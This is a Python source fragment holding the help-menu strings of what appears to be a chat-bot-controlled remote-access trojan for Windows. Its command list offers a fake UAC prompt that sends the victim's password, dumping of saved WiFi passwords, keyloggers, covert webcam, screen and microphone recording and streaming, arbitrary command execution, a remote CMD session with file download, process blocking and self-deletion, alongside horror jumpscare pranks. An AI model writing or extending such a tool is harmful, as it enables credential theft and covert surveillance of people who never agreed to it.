CMD_SESSION_HELP = r"""
exit - Exits the cmd session without killing it.

___ SPECIAL COMMANDS ___
:download <path> - Downloads a file. A file larger then 30MB will be split in more files.
:kill - Kill the cmd session, also kills the process.
"""

DUCKYHELP = r"""DELAY [time] – Adds a delay in milliseconds (e.g., DELAY 1000 waits 1 second).
REM [comment] – Adds a comment (e.g., REM This is a comment).
STRING [text] – Types a string of characters (e.g., STRING Hello World).
ENTER – Presses the Enter key.
SPACE – Presses the Spacebar.
TAB – Presses the Tab key.
ESC – Presses the Escape key.
CTRL – Presses the Control key.
SHIFT – Presses the Shift key.
ALT – Presses the Alt key.
GUI – Presses the Windows key (or the "Command" key on macOS).
WINDOWS – Same as GUI.
APP – Presses the "Application" key (context menu key).
DOWNARROW, UPARROW, LEFTARROW, RIGHTARROW – Presses arrow keys.
CAPSLOCK – Toggles Caps Lock.
NUMLOCK – Toggles Num Lock.
DELETE – Presses the Delete key.
HOME – Presses the Home key.
END – Presses the End key.
PAGEUP – Presses Page Up.
PAGEDOWN – Presses Page Down."""

HELP = r"""
🏠 Main Menu
mainmenu - Shows main menu.

🛑 System & Shutdown
fakeuac - Fake UAC prompt, sends password.
shutdown - Power off PC.
fakeshutdown - Fake shutdown sequence.
altf4 - Press Alt+F4.
clear - Clean windows, webcam, temp files.
selfdestruction - Remove program permanently.

🌐 Network & Remote Access
wifiinfo - Show saved WiFi passwords.
getip - Get public IP and location.

📸 Camera & Screen
selfie - Take webcam photo.
screenshot - Capture screen.
fullclip - Record screen + webcam.
webcamclip - Record webcam only.
screenclip - Record screen only.
recordjum - Record 20s jumpscare reaction.
waitforface - Send photo when face detected.
displaymode - Change display settings.
webcamstreamstart - Start webcam stream.
screenstreamstart - Start screen stream.
webcamstreamstop - Stop webcam stream.
screenstreamstop - Stop screen stream.
webcamandscreenstreamstart - Both streams.
webcamandscreenstreamstop - Stop both streams.

🔊 Audio & Volume
urltoast - Windows toast with URL.
playrandomnoise - Play static/interference.
microphone - Record audio from mic.
mutevolume - Mute system.
fullvolume - Max volume.
setvolume - Set volume level.
getvolume - Check current volume.
mixermenu - Audio controls menu.
playfromurl - Play audio from URL.

🎵 Sound Effects
breath - Play breathing sound.
fart - Play fart sound.
knockknock - Play door knocking.
pss - Play "psst" sound.
tralalerotralala - Play Italian brainrot.
scream11s - (Horror) 11 second scream.
scream15s - (Horror) 15 second scream.
behindyou_kid - (Horror) "Behind you" (child voice).
behindyou_whisper - (Horror) "Behind you" (whisper voice).

😈 Pranks & Visuals
jumpscare - Random jumpscare.
whisperoverlay - Displays subtle creepy messages in corner of screen.
jumpscarenoaudio - Jumpscare without sound.
invertedscreen - Invert screen colors.
distortedscreen - Distort screen image.
messagebox - Custom message box.
messagespam - Spam message boxes.
camerawallpaper - Webcam as wallpaper.
setvideowallpaper - Video as wallpaper.
hdmi_drowning_effect - Noise overlay.
stop_hdmi_drowning_effect - Stop overlay.
disturbed_overlay_and_random_noise - Noise overlay + audio.

💻 System Control
execute - Run system command.
processkiller - Kill process from list.
terminateprocess - Kill process by name.
procmonmenu - Process monitor menu.
procmonadd - Add to process monitor.
procmonrem - Remove from process monitor.
cmdsession - Open CMD session.

🎮 Input / Device Control
randomkeyboard - Randomize keyboard input.
capslock - Toggle Caps Lock.
mousecontroller - Mouse control menu.
mouselock - Lock mouse position.
setMouseJump - Set mouse movement distance.

📋 Messaging
bsend - Send text message.
id - Get chat ID.
deletemessages - Delete last N messages.
deleteallmessages - Delete all messages.

🔒 Can't Open List
cantopenadd - Block process.
cantopenremove - Unblock process.
cantopenmenu - View blocked processes.

🧠 Keylogger
keylogger - Log keystrokes to file.
livekeylogger - Live keystroke updates.

🦑 Misc
plankton - Plankton jumpscare.
planktonnoaudio - Plankton without audio.
johnpork - John Pork jumpscare.
johnporknoaudio - John Pork without audio.
gabinetti - Gabinetti meme.
duckyscript - Run DuckyScript.
duckyhelp - DuckyScript commands.
browser - Open URL.

📎 File Input Commands
*sending a photo* - Displays the photo on the screen as a pop-up.

*sending a photo with "/jumpscare" caption* - Will create a jumpscare with that photo.

*sending a video with /setvideowallpaper as caption will play it as wallpaper(dont use long videos).

*sending an audio/voice* - Will play the audio/voice in the background.

*sending a file that ends with '.dd' - will execute it as duckyscript. (send /duckyhelp to get commands)

*sending a file with /save and the path will save that file in that path, no matter the extension. (example *photo* /save C:\Users\YOURUSER\Photo\*

📚 Multi-Command
You can run multiple commands at the same time by sending them in the same message but separated by a comma.
For example this command: "/fullclip 10; /jumpscare" will start the recording, waits 5 seconds, then sends a
jumpscare while recording screen and webcam
"""